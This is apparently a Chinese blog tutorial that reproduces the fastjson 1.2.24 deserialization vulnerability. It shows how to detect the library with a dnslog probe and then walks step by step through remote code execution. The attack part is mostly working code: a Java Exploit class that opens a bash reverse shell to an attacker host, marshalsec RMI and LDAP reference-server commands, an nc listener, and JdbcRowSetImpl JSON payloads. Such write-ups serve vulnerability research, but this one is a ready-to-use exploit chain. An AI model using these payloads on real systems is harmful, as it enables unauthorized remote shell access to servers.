fastjson反序列化复现

2021-09-13
  • 探测是否使用了fastjson

通过报错，因为fastjson会解析json数据，如果传输不完整数据有可能会有报错信息回显，在报文中可能存在fastjson信息。

1.2.24以下版本不会任何信息

  • 探测是否存在fastjson漏洞

通过dnslog回显判断

访问dnslog.cn，点击Get SubDomain生成一个域名

发送payload

{"zeo":{"@type":"java.net.Inet4Address","val":"ffyli6.dnslog.cn"}}

dnslog有记录则存在fastjson漏洞

  • 漏洞复现

版本：1.2.24

攻击机为192.168.1.100

借助RMI

exp

public class Exploit {
    public Exploit(){
        try{
            Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/192.168.1.100/28888 0>&1");
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Exploit e = new Exploit();
    }
}
javac Exploit.java  安装JDK8版本

编译生成Exploit.class

在该文件目录启动一个http服务等会加载Exploit.class

python3 -m http.server 8886

然后再启动RMI服务监听9998端口

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://1.15.173.56:8886/#Exploit" 9998

再监听端口28888

nc -lvvp 28888

发送payload反弹shell

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.1.100:9998/Exploit",
        "autoCommit":true
    }
}

反弹shell成功

借助LDAP

步骤跟上面一样

payload

{
  "name":{
    "@type":"java.lang.Class",   
    "val":"com.sun.rowset.JdbcRowSetImpl"
  },
  "x":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",   
    "dataSourceName":"ldap://192.168.1.100:9998/Exploit",   
    "autoCommit":true
  }
}

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.100:8886/#Exploit 9998

反弹shell成功

还有很多其他版本的漏洞，payload类似，只是黑名单不同。
